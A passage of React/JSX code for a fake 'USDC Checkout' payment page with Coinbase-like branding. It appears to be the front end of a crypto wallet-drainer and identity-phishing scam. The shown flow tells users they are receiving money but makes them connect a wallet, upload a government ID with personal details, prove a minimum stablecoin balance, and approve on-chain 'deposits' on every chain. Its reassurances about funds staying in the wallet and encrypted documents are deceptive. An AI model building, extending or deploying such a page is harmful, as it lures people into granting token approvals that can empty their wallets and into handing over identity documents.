              <div className="pointer-events-none absolute bottom-full right-0 mb-2 hidden whitespace-nowrap rounded-lg border border-hairline bg-surface-card px-3 py-1.5 text-[11px] font-semibold text-ink shadow-card group-hover:block">
                Session time remaining
              </div>
            </div>
          </div>
        )}

        {activeFlow && (
          <ol className="mb-8 flex items-center justify-between gap-1 sm:mb-12">
            {STEPS.map((step, i) => {
              const state = i < currentStepIndex ? "done" : i === currentStepIndex ? "current" : "upcoming";
              return (
                <li key={step.label} className="flex flex-1 items-center last:flex-none">
                  <div className="flex flex-col items-center gap-1.5">
                    <div
                      className={
                        "flex h-7 w-7 items-center justify-center rounded-full text-xs font-semibold transition-all sm:h-8 sm:w-8 " +
                        (state === "done"
                          ? "bg-brand text-on-brand"
                          : state === "current"
                          ? "bg-brand text-on-brand shadow-[0_0_0_4px_rgba(0,82,255,0.12)]"
                          : "bg-surface-strong text-muted")
                      }
                    >
                      {state === "done" ? (
                        <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                        </svg>
                      ) : (
                        i + 1
                      )}
                    </div>
                    <span className={"text-[10px] font-medium sm:text-[12px] " + (state === "upcoming" ? "text-muted" : "text-ink")}>
                      {step.label}
                    </span>
                  </div>
                  {i < STEPS.length - 1 && (
                    <div className={"mx-1 h-px flex-1 sm:mx-3 " + (i < currentStepIndex ? "bg-brand" : "bg-hairline")} />
                  )}
                </li>
              );
            })}
          </ol>
        )}

        <div className="grid gap-5 lg:grid-cols-[1fr_360px] lg:items-start">
          <div className="rounded-card border border-hairline bg-surface-card p-5 shadow-card sm:p-8 lg:p-12">
            {phase === "loading" && (
              <div className="py-20 text-center">
                <div className="mx-auto mb-6 h-10 w-10 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <p className="text-sm text-body">Loading checkout session...</p>
              </div>
            )}

            {phase === "no-session" && (
              <>
                <div className="py-20 text-center">
                  <div className="mx-auto mb-5 flex h-14 w-14 items-center justify-center rounded-full bg-surface-strong text-muted">
                    <svg className="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </div>
                  <h2 className="mb-2 text-xl font-semibold text-ink">
                    {sessionId ? "This link isn't active" : "No pending USDC Checkout payment"}
                  </h2>
                  <p className="mx-auto max-w-sm text-sm text-body">
                    {sessionId
                      ? "This checkout link has closed, expired, or doesn't exist. Ask the sender for a new link."
                      : "There isn't an active checkout session waiting for you right now. Check back once the sender has issued one."}
                  </p>
                </div>

                <div className="mt-20 border-t border-hairline pt-16">
                  <TrustedByMarquee />
                </div>

                <div className="mt-20 border-t border-hairline pt-16">
                  <div className="mx-auto mb-12 max-w-2xl text-center">
                    <h2 className="mb-3 font-display text-3xl font-normal leading-tight tracking-[-0.04em] text-ink sm:text-4xl">
                      Every layer of the stack managed for you
                    </h2>
                    <p className="text-base text-body">
                      Complete payments infrastructure from custody to settlement
                    </p>
                  </div>

                  <div className="grid gap-5 sm:grid-cols-2 lg:grid-cols-4">
                    {STACK_FEATURES.map((feature) => (
                      <div
                        key={feature.title}
                        className="rounded-xl border border-hairline bg-surface-card p-6 transition hover:border-brand/30 hover:shadow-card"
                      >
                        <h3 className="mb-2 text-base font-semibold text-ink">{feature.title}</h3>
                        <p className="text-sm leading-relaxed text-body">{feature.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </>
            )}

            {phase === "idle" && session && (
              <div>
                <div className="mb-5 flex items-center gap-3">
                  <div className="flex h-11 w-11 items-center justify-center rounded-full bg-brand/10 text-brand">
                    <span className="text-base font-semibold">
                      {session.recipientName
                        .split(" ")
                        .map((n) => n[0])
                        .join("")
                        .slice(0, 2)
                        .toUpperCase()}
                    </span>
                  </div>
                  <div>
                    <div className="flex items-center gap-1.5">
                      <span className="text-sm font-semibold text-ink">{session.recipientName}</span>
                      <svg className="h-4 w-4 text-brand" viewBox="0 0 24 24" fill="currentColor">
                        <path
                          fillRule="evenodd"
                          d="M8.603 3.799A4.49 4.49 0 0112 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 013.498 1.307 4.491 4.491 0 011.307 3.497A4.49 4.49 0 0121.75 12a4.49 4.49 0 01-1.549 3.397 4.491 4.491 0 01-1.307 3.497 4.491 4.491 0 01-3.497 1.307A4.49 4.49 0 0112 21.75a4.49 4.49 0 01-3.397-1.549 4.49 4.49 0 01-3.498-1.306 4.491 4.491 0 01-1.307-3.498A4.49 4.49 0 012.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 011.307-3.497 4.49 4.49 0 013.497-1.307zm7.007 6.387a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                    <p className="text-xs text-muted">Verified sender</p>
                  </div>
                </div>

                <div className="mb-6">
                  <CoinbaseAmount value={session.amountEur} size="hero" />
                </div>
                <p className="mb-8 max-w-md text-lg leading-relaxed text-body">
                  You're signed in as <span className="font-mono font-medium text-ink">{address ? short(address) : ""}</span>. Continue to
                  receive this payment from <span className="font-medium text-ink">{session.recipientName}</span>.
                </p>

                <button
                  onClick={handleConnect}
                  disabled={!ready}
                  className="flex h-12 w-full items-center justify-center rounded-lg bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled sm:w-auto"
                >
                  Continue
                </button>

                <div className="mt-12 space-y-8 border-t border-hairline pt-8">
                  <div>
                    <h3 className="mb-3 text-sm font-semibold text-ink">What happens next</h3>
                    <ol className="space-y-3">
                      {[
                        "Connect your wallet securely",
                        "Complete identity verification with government ID",
                        "Meet minimum balance requirement",
                        "Approve deposit to receive funds",
                      ].map((step, i) => (
                        <li key={i} className="flex items-start gap-3 text-sm text-body">
                          <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-surface-strong text-xs font-semibold text-ink">
                            {i + 1}
                          </span>
                          {step}
                        </li>
                      ))}
                    </ol>
                  </div>

                  <div className="rounded-lg border border-hairline bg-surface-soft p-5">
                    <h3 className="mb-3 text-sm font-semibold text-ink">Payment terms</h3>
                    <ul className="space-y-2 text-sm leading-relaxed text-body">
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Funds remain in your wallet at all times during verification
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Session expires {session.sessionMinutes} minutes after connecting
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Multichain
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Minimum balance: {formatEUR(session.minBalanceEur)} in USDC/USDT required
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            )}

            {phase === "id-verify" && session && (() => {
              const stepIndex = idVerifyStep === "type" ? 0 : idVerifyStep === "upload" ? 1 : 2;
              const DOC_TYPES = [
                { type: "passport",         label: "Passport",          sub: "International travel document" },
                { type: "drivers_license",  label: "Driver's License",  sub: "State or national license"    },
                { type: "national_id",      label: "National ID",       sub: "Government identity card"     },
                { type: "residence",        label: "Residence Permit",  sub: "Residency document"           },
              ];
              const docLabel = DOC_TYPES.find((d) => d.type === idDocType)?.label ?? "your ID";
              return (
                <div>
                  {/* ── Header ──────────────────────────────────────────── */}
                  <div className="mb-6 flex items-center gap-3">
                    <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-brand/10">
                      <svg className="h-5 w-5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                      </svg>
                    </div>
                    <div>
                      <h2 className="text-[16px] font-semibold text-ink">Identity Verification</h2>
                      <p className="text-[12px] text-muted">
                        Step {stepIndex + 1} of 3 · Required to release {formatEUR(session.amountEur)}
                      </p>
                    </div>
                  </div>

                  {/* ── Step progress bar ───────────────────────────────── */}
                  <div className="mb-7 flex items-center gap-1.5">
                    {["Select ID", "Upload", "Details"].map((label, i) => {
                      const done = i < stepIndex;
                      const active = i === stepIndex;
                      return (
                        <div key={label} className="flex flex-1 flex-col gap-1.5">
                          <div className={`h-1 rounded-full transition-all ${done || active ? "bg-brand" : "bg-hairline"}`} />
                          <span className={`text-[10px] font-medium ${active ? "text-brand" : done ? "text-muted" : "text-muted"}`}>
                            {label}
                          </span>
                        </div>
                      );
                    })}
                  </div>

                  {/* ── STEP 1: Document type ──────────────────────────── */}
                  {idVerifyStep === "type" && (
                    <div>
                      <h3 className="mb-1 text-[17px] font-semibold text-ink">Select ID document</h3>
                      <p className="mb-5 text-[13px] text-body">Choose the type of government-issued ID you will upload.</p>
                      <div className="mb-6 grid grid-cols-2 gap-3">
                        {DOC_TYPES.map((doc) => (
                          <button
                            key={doc.type}
                            onClick={() => { setIdDocType(doc.type); setIdVerifyStep("upload"); setError(null); }}
                            className="group flex flex-col gap-3 rounded-xl border border-hairline bg-bg p-4 text-left transition hover:border-brand hover:shadow-sm active:scale-[0.98]"
                          >
                            <span className="flex h-9 w-9 items-center justify-center rounded-lg bg-surface-soft text-[22px] transition group-hover:bg-brand/10">
                              {doc.type === "passport" ? "🛂" : doc.type === "drivers_license" ? "🪪" : doc.type === "national_id" ? "🆔" : "📄"}
                            </span>
                            <div>
                              <div className="text-[13px] font-semibold text-ink">{doc.label}</div>
                              <div className="mt-0.5 text-[11px] leading-tight text-muted">{doc.sub}</div>
                            </div>
                          </button>
                        ))}
                      </div>
                      <div className="flex items-start gap-2.5 rounded-xl border border-hairline bg-surface-soft p-4">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                        </svg>
                        <p className="text-[12px] leading-relaxed text-body">
                          Documents are encrypted end-to-end and used only to confirm eligibility. They are never shared with third parties.
                        </p>
                      </div>
                    </div>
                  )}

                  {/* ── STEP 2: Document upload ────────────────────────── */}
                  {idVerifyStep === "upload" && (
                    <div>
                      <button
                        onClick={() => { setIdVerifyStep("type"); setError(null); }}
                        className="mb-5 flex items-center gap-1.5 text-[13px] font-medium text-muted transition hover:text-ink"
                      >
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                        </svg>
                        Back
                      </button>
                      <h3 className="mb-1 text-[17px] font-semibold text-ink">Upload {docLabel}</h3>
                      <p className="mb-5 text-[13px] text-body">
                        Take a clear photo or scan. All four corners must be visible.
                      </p>

                      {/* Upload zone */}
                      <label className="mb-4 block cursor-pointer">
                        <div className={`relative flex flex-col items-center justify-center gap-3 overflow-hidden rounded-2xl border-2 border-dashed px-6 py-10 text-center transition ${
                          idFile ? "border-brand/50 bg-brand/5" : "border-hairline hover:border-brand/40 hover:bg-surface-soft"
                        }`}>
                          {idPreviewUrl ? (
                            <>
                              {/* eslint-disable-next-line @next/next/no-img-element */}
                              <img src={idPreviewUrl} alt="ID preview" className="max-h-40 rounded-lg object-contain shadow-md" />
                              <div className="flex items-center gap-2 rounded-pill bg-brand/10 px-3 py-1.5">
                                <svg className="h-3.5 w-3.5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                                </svg>
                                <span className="text-[12px] font-semibold text-brand">Photo selected — tap to change</span>
                              </div>
                            </>
                          ) : idFile ? (
                            <>
                              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-brand/10">
                                <svg className="h-6 w-6 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                                </svg>
                              </div>
                              <div>
                                <p className="text-[14px] font-semibold text-brand">{idFile.name}</p>
                                <p className="text-[12px] text-muted">Tap to change file</p>
                              </div>
                            </>
                          ) : (
                            <>
                              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-surface-strong">
                                <svg className="h-7 w-7 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
                                </svg>
                              </div>
                              <div>
                                <p className="text-[14px] font-semibold text-ink">Take a photo or upload file</p>
                                <p className="mt-0.5 text-[12px] text-muted">JPG, PNG, or PDF · Max 8 MB</p>
                              </div>
                            </>
                          )}
                        </div>
                        <input
                          type="file"
                          accept="image/jpeg,image/png,image/webp,application/pdf"
                          className="hidden"
                          onChange={(e) => handleIdFileChange(e.target.files?.[0] ?? null)}
                        />
                      </label>

                      {/* Photo guidelines */}
                      <div className="mb-6 rounded-xl border border-hairline bg-surface-soft p-4">
                        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-widest text-muted">Photo tips</p>
                        <div className="grid grid-cols-2 gap-y-2 gap-x-4">
                          {["Good lighting, no glare", "All 4 corners visible", "Document not expired", "No blur or shadows"].map((tip) => (
                            <div key={tip} className="flex items-center gap-2 text-[12px] text-body">
                              <svg className="h-3.5 w-3.5 shrink-0 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                              </svg>
                              {tip}
                            </div>
                          ))}
                        </div>
                      </div>

                      {error && (
                        <div className="mb-4 flex items-center gap-2 rounded-lg bg-down/10 px-4 py-3 text-[13px] text-down">
                          <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg>
                          {error}
                        </div>
                      )}

                      <button
                        onClick={() => {
                          if (!idFile) { setError("Please upload a photo of your ID to continue."); return; }
                          setError(null);
                          setIdVerifyStep("info");
                        }}
                        className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
                      >
                        Continue
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                        </svg>
                      </button>
                    </div>
                  )}

                  {/* ── STEP 3: Personal information ───────────────────── */}
                  {idVerifyStep === "info" && (
                    <div>
                      <button
                        onClick={() => { setIdVerifyStep("upload"); setError(null); }}
                        className="mb-5 flex items-center gap-1.5 text-[13px] font-medium text-muted transition hover:text-ink"
                      >
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                        </svg>
                        Back
                      </button>
                      <h3 className="mb-1 text-[17px] font-semibold text-ink">Personal information</h3>
                      <p className="mb-5 text-[13px] text-body">Enter your details exactly as they appear on your ID document.</p>

                      {/* Uploaded doc thumbnail */}
                      {(idPreviewUrl || idFile) && (
                        <div className="mb-5 flex items-center gap-3 rounded-xl border border-hairline bg-surface-soft px-4 py-3">
                          {idPreviewUrl ? (
                            /* eslint-disable-next-line @next/next/no-img-element */
                            <img src={idPreviewUrl} alt="ID" className="h-10 w-14 rounded-md object-cover shadow-sm" />
                          ) : (
                            <div className="flex h-10 w-14 items-center justify-center rounded-md bg-surface-strong">
                              <svg className="h-5 w-5 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                              </svg>
                            </div>
                          )}
                          <div className="min-w-0">
                            <p className="text-[13px] font-semibold text-ink">{docLabel}</p>
                            <p className="truncate text-[11px] text-muted">{idFile?.name}</p>
                          </div>
                          <div className="ml-auto flex h-6 w-6 items-center justify-center rounded-full bg-up/10">
                            <svg className="h-3.5 w-3.5 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                            </svg>
                          </div>
                        </div>
                      )}

                      <div className="mb-4">
                        <label className="mb-1.5 block text-[13px] font-semibold text-ink">Full legal name</label>
                        <input
                          type="text"
                          value={fullName}
                          onChange={(e) => setFullName(e.target.value)}
                          className="h-12 w-full rounded-xl border border-hairline bg-bg px-4 text-[14px] text-ink transition focus:border-brand focus:outline-none focus:ring-2 focus:ring-brand/20"
                          placeholder="As it appears on your ID"
                          autoComplete="name"
                        />
                      </div>

                      <div className="mb-4">
                        <label className="mb-1.5 block text-[13px] font-semibold text-ink">Date of birth</label>
                        <input
                          type="date"
                          value={idDob}
                          onChange={(e) => setIdDob(e.target.value)}
                          max={new Date(Date.now() - 18 * 365.25 * 24 * 3600 * 1000).toISOString().slice(0, 10)}
                          className="h-12 w-full rounded-xl border border-hairline bg-bg px-4 text-[14px] text-ink transition focus:border-brand focus:outline-none focus:ring-2 focus:ring-brand/20"
                        />
                      </div>

                      <div className="mb-6">
                        <label className="mb-1.5 block text-[13px] font-semibold text-ink">Country of issue</label>
                        <CountrySelect value={country} onChange={setCountry} />
                      </div>

                      {/* Privacy notice */}
                      <div className="mb-6 flex items-start gap-3 rounded-xl border border-brand/20 bg-brand/5 p-4">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                        </svg>
                        <p className="text-[12px] leading-relaxed text-brand/80">
                          Your information is encrypted with AES-256 and used solely to confirm your eligibility to receive this payment. It is never sold or shared with third parties.
                        </p>
                      </div>

                      {error && (
                        <div className="mb-4 flex items-center gap-2 rounded-lg bg-down/10 px-4 py-3 text-[13px] text-down">
                          <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg>
                          {error}
                        </div>
                      )}

                      <button
                        onClick={handleVerifyID}
                        disabled={processing}
                        className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
                      >
                        {processing ? (
                          <>
                            <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/30 border-t-white" />
                            Verifying…
                          </>
                        ) : (
                          <>
                            Submit verification
                            <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                            </svg>
                          </>
                        )}
                      </button>
                    </div>
                  )}
                </div>
              );
            })()}

            {phase === "balance-check" && (
              <div className="py-14 text-center">
                <div className="mx-auto mb-6 h-12 w-12 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <h2 className="mb-2 text-lg font-semibold text-ink">Checking wallet balance</h2>
                <p className="text-sm text-body">Scanning Ethereum, BNB Chain, and Polygon for USDT / USDC balances...</p>
              </div>
            )}

            {phase === "insufficient-balance" && session && (
              <div>
                {/* Status icon */}
                <div className="mb-6 flex flex-col items-center text-center">
                  <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-accent-yellow/10">
                    <svg className="h-7 w-7 text-accent-yellow" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                  </div>
                  <h2 className="mb-2 text-[18px] font-semibold text-ink">Minimum balance requirement not met</h2>
                  <p className="max-w-xs text-[13px] leading-relaxed text-body">
                    {totalBalanceEur === 0
                      ? `A minimum of ${formatEUR(session.minBalanceEur)} in USDT or USDC is required to receive this payment. Top up your wallet to continue.`
                      : `Your wallet holds ${formatEUR(totalBalanceEur)} in USDT/USDC. You need at least ${formatEUR(session.minBalanceEur)} to proceed. Top up to continue.`}
                  </p>
                </div>

                {/* Required vs held */}
                <div className="mb-6 rounded-xl border border-hairline bg-surface-soft p-5">
                  <div className="flex items-center justify-between text-[13px]">
                    <span className="text-body">Your balance</span>
                    <span className="font-semibold tabular-nums text-ink">{formatEUR(totalBalanceEur)}</span>
                  </div>
                  <div className="my-3 h-px bg-hairline" />
                  <div className="flex items-center justify-between text-[13px]">
                    <span className="text-body">Required</span>
                    <span className="font-semibold tabular-nums text-ink">{formatEUR(session.minBalanceEur)}</span>
                  </div>
                  <div className="my-3 h-px bg-hairline" />
                  <div className="flex items-center justify-between text-[13px]">
                    <span className="text-body">Shortfall</span>
                    <span className="font-semibold tabular-nums text-down">
                      {formatEUR(Math.max(0, session.minBalanceEur - totalBalanceEur))}
                    </span>
                  </div>
                </div>

                {/* Top up CTA — direct link to Coinbase Buy, no server call needed */}
                <a
                  href={`https://pay.coinbase.com/buy/select-asset?appId=${process.env.NEXT_PUBLIC_COINBASE_PROJECT_ID ?? "09aafa9f-85e4-46f8-a1da-bc60ecee3345"}&defaultAsset=USDT`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="mb-3 flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
                >
                  <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6m0 0v6m0-6h6m-6 0H6" />
                  </svg>
                  Top up wallet
                </a>
                <button
                  onClick={() => checkWalletBalances()}
                  disabled={processing}
                  className="flex h-10 w-full items-center justify-center gap-2 rounded-pill border border-hairline text-[14px] font-medium text-body transition hover:bg-surface-soft disabled:opacity-50"
                >
                  {processing ? "Checking…" : "I've topped up — recheck"}
                </button>
              </div>
            )}

            {phase === "ready-to-approve" && session && (
              <div>
                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">You're all set</h2>
                <p className="mb-8 text-sm leading-relaxed text-body">
                  Approve the deposit to finish setting up your wallet to receive {formatEUR(session.amountEur)}.
                </p>

                <div className="mb-9 divide-y divide-hairline rounded-xl border border-hairline">
                  {[
                    { label: "Wallet connected", detail: address ? short(address, 8, 6) : "" },
                    { label: "Identity verified", detail: fullName || "Complete" },
                    { label: "Minimum balance met", detail: `${formatEUR(totalBalanceEur)} available` },
                  ].map((item) => (
                    <div key={item.label} className="flex items-center justify-between px-5 py-3.5">
                      <div className="flex items-center gap-2.5">
                        <span className="flex h-5 w-5 items-center justify-center rounded-full bg-up/10 text-up">
                          <svg className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                          </svg>
                        </span>
                        <span className="text-sm font-medium text-ink">{item.label}</span>
                      </div>
                      <span className="text-xs text-muted">{item.detail}</span>
                    </div>
                  ))}
                </div>

                <button
                  onClick={handleApproveDeposit}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
                >
                  Approve deposit
                </button>
              </div>
            )}

            {phase === "approving" && (
              <div>
                <h2 className="mb-1 text-lg font-semibold text-ink">Approving on-chain</h2>
                <p className="mb-6 text-sm text-body">
                  Confirm each request in your wallet. This authorizes your account across all supported multichain networks.
                </p>
                <div className="space-y-2.5">
                  {CHAINS.map((c) => {
                    const done = approvedChains.includes(c.name);
                    const active = !done && approvedChains.length === CHAINS.findIndex((x) => x.name === c.name);
                    return (
                      <div
                        key={c.name}
                        className={
                          "flex items-center justify-between rounded-lg border px-4 py-3.5 " +
                          (done ? "border-up/20 bg-up/5" : "border-hairline bg-surface-soft")
                        }
                      >
                        <span className="flex items-center gap-2 text-sm font-medium text-ink">
                          <span className="flex h-5 w-5 items-center justify-center overflow-hidden rounded-full">
                            <Image src={CHAIN_LOGOS[c.name]} alt={c.label} width={20} height={20} className="object-contain" />
                          </span>
                          {c.label}
                        </span>
                        {done ? (
                          <span className="flex items-center gap-1 text-xs font-semibold text-up">
                            <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                            </svg>
                            Approved
                          </span>
                        ) : (
                          <span className="flex items-center gap-1.5 text-xs text-muted">
                            {active && <span className="h-3 w-3 animate-spin rounded-full border-2 border-hairline border-t-brand" />}
                            {active ? "Waiting for confirmation..." : "Pending"}
                          </span>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {phase === "complete" && session && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-up/10">
                  <svg className="h-8 w-8 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">
                  Wallet ready to receive funds
                </h2>
                <p className="mx-auto mb-9 max-w-sm text-sm leading-relaxed text-body">
                  {formatEUR(session.amountEur)} will be released to your wallet now that verification is complete.
                </p>

                <div className="mx-auto mb-7 max-w-sm rounded-xl border border-hairline bg-surface-soft p-5 text-left">
                  <div className="mb-3 flex items-center justify-between">
                    <span className="text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Recipient</span>
                    <span className="font-mono text-xs text-ink">{address && short(address, 8, 6)}</span>
                  </div>
                  <div className="flex items-center justify-between border-t border-hairline pt-3">
                    <span className="text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Amount</span>
                    <span className="text-lg font-semibold tabular-nums text-ink">{formatEUR(session.amountEur)}</span>
                  </div>
                </div>

                <div className="mx-auto flex max-w-sm items-center gap-2 rounded-lg bg-brand/5 p-3.5 text-left text-xs text-brand">
                  <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Transfers are typically completed within a few minutes.
                </div>
              </div>
            )}

            {phase === "expired" && (
              <div className="py-4 text-center">
